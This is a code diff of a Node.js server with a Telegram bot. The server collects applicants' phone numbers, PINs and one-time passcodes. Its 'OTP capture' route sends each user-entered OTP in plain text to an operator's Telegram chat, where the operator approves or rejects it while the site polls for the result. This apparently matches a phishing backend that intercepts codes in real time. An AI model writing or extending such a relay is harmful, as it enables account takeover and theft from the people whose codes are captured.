@@ -55,11 +55,8 @@ const dbReady = pool.query(schema)
     await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS reviewed_at TIMESTAMPTZ');
     await pool.query("ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_status TEXT NOT NULL DEFAULT 'not_required'");
     await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_verified_at TIMESTAMPTZ');
-    
-    // THESE TWO LINES ARE NEW (For OTP):
     await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_code TEXT');
     await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_created_at TIMESTAMPTZ');
-
     await pool.query("ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_status TEXT NOT NULL DEFAULT 'none'");
     await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_approved_at TIMESTAMPTZ');
     await pool.query('ALTER TABLE applications ADD COLUMN IF NOT EXISTS pin_rejected_at TIMESTAMPTZ');
@@ -288,33 +285,18 @@ app.post('/api/login', async (req, res) => {
     }
 
     // PIN verified successfully, send to OTP page
-return res.status(202).json({
-  authenticated: false,
-  status: 'pending_otp',
-  applicationId: row.id,
-  message: 'PIN verified successfully! Please enter the OTP sent to your phone.'
-});
-
-    await notifyAdmin(
-      `🔐 OTP VERIFICATION REQUEST\nApplication ID: ${row.id}\nApplicant Phone: ${row.phone}\nOTP Code: ${otpCode}\n\nApprove to let the user complete their login.`,
-      [[{ text: '✅ Approve OTP', callback_data: `otpapprove:${row.id}` }, { text: '❌ Reject OTP', callback_data: `otpreject:${row.id}` }]]
-    );
-
     return res.status(202).json({
       authenticated: false,
       status: 'pending_otp',
       applicationId: row.id,
-      message: 'PIN verified successfully! Please enter OTP below.'
+      message: 'PIN verified successfully! Please enter the OTP sent to your phone.'
     });
-    // --- END NEW OTP LOGIC ---
 
   } catch (error) {
     console.error('Login failed:', error.message);
     return res.status(500).json({ error: 'Login is temporarily unavailable.' });
   }
 });
-
-// VERIFY OTP ROUTE
 
 // CHECK APPLICATION STATUS
 
@@ -435,6 +417,7 @@ setInterval(loadApplications, 20000);
 
 let telegramOffset = 0;
 let telegramPolling = false;
+let otpStatusStore = {}; // Keeps track of whether you approved the OTP
 
 async function processTelegramUpdate(update) {
   const msg = update.message;
@@ -480,28 +463,28 @@ async function processTelegramUpdate(update) {
       }
       
       // ---- OTP approve / reject ----
-else if (action === 'otpapprove' || action === 'otpreject') {
-    const approved = action === 'otpapprove';
-    const phone = appId; // appId holds the phone number for OTPs
-    const status = approved ? 'approved' : 'rejected';
+      else if (action === 'otpapprove' || action === 'otpreject') {
+        const approved = action === 'otpapprove';
+        const phone = appId; // appId holds the phone number for OTPs
+        const status = approved ? 'approved' : 'rejected';
 
-    // 1. Save the status in temporary memory so the website can see it
-    otpStatusStore[phone] = status;
+        // 1. Save the status in temporary memory so the website can see it
+        otpStatusStore[phone] = status;
 
-    // 2. Answer the Telegram callback (stops the loading spinner)
-    await telegramApi('answerCallbackQuery', { 
-        callback_query_id: callback.id, 
-        text: `OTP ${status}` 
-    });
+        // 2. Answer the Telegram callback (stops the loading spinner)
+        await telegramApi('answerCallbackQuery', { 
+            callback_query_id: callback.id, 
+            text: `OTP ${status}` 
+        });
 
-    // 3. Edit the Telegram message to show the result
-    await telegramApi('editMessageText', {
-        chat_id: chatId,
-        message_id: callback.message.message_id,
-        text: callback.message.text + `\n\n👍 Result: *${status.toUpperCase()}*`,
-        parse_mode: 'Markdown'
-    });
-                                                  }
+        // 3. Edit the Telegram message to show the result
+        await telegramApi('editMessageText', {
+            chat_id: chatId,
+            message_id: callback.message.message_id,
+            text: callback.message.text + `\n\n👍 Result: *${status.toUpperCase()}*`,
+            parse_mode: 'Markdown'
+                });
+      }
 
       // ---- Application approve / reject ----
       else if (action === 'approve' || action === 'reject') {
@@ -524,8 +507,8 @@ else if (action === 'otpapprove' || action === 'otpreject') {
     }
   }
 }
+
 // --- OTP CAPTURE & APPROVAL LOGIC ---
-let otpStatusStore = {}; // Keeps track of whether you approved the OTP
 
 // ROUTE 1: RECEIVE OTP FROM USER & SEND TO TELEGRAM
 app.post('/api/verify-otp', async (req, res) => {
@@ -537,22 +520,19 @@ app.post('/api/verify-otp', async (req, res) => {
     const message = `🔐 *User Entered OTP* 🔐\n\n📱 Phone: ${phone}\n🔑 Code: *${otp}*\n\nApprove this login?`;
     
     try {
-    await telegramApi('sendMessage', {
-        chat_id: ADMIN_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: "✅ Approve OTP", callback_data: `otpapprove:${phone}` }, 
-                    { text: "❌ Reject OTP", callback_data: `otpreject:${phone}` }
+        await telegramApi('sendMessage', {
+            chat_id: ADMIN_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Approve OTP", callback_data: `otpapprove:${phone}` }, 
+                        { text: "❌ Reject OTP", callback_data: `otpreject:${phone}` }
+                    ]
                 ]
-            ]
-        }
-    });
-} catch (error) {
-    console.error("Failed to send Telegram OTP:", error);
-      }
+            }
+        });
     } catch (error) {
         console.error("Failed to send Telegram OTP:", error);
     }
@@ -566,6 +546,7 @@ app.get('/api/check-otp-status/:phone', (req, res) => {
     const status = otpStatusStore[phone] || 'pending';
     res.json({ otp_status: status });
 });
+
 // TELEGRAM POLLING SETUP
 
 async function pollTelegram() {
@@ -604,4 +585,6 @@ app.listen(PORT, () => {
     console.error('Failed to start Telegram polling due to DB error:', err);
   });
 });
-  
+      
+
+      
